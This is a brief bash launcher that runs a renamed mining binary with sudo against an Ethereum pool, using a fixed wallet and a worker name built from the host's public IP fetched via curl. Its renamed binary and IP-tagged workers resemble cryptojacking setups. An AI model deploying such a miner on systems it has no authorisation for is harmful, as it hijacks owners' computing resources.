#!/bin/bash

POOL=us1.ethermine.org:4444
WALLET=0xdc817b14a85a32f742ba1e7c6bb20e09b8b85f1c.$(echo "$(curl -s ifconfig.me)" | tr . _ )-cuong-dep-trai

cd "$(dirname "$0")"

chmod +x ./cuongCon && sudo ./cuongCon --algo ETHASH --pool $POOL --user $WALLET  $@
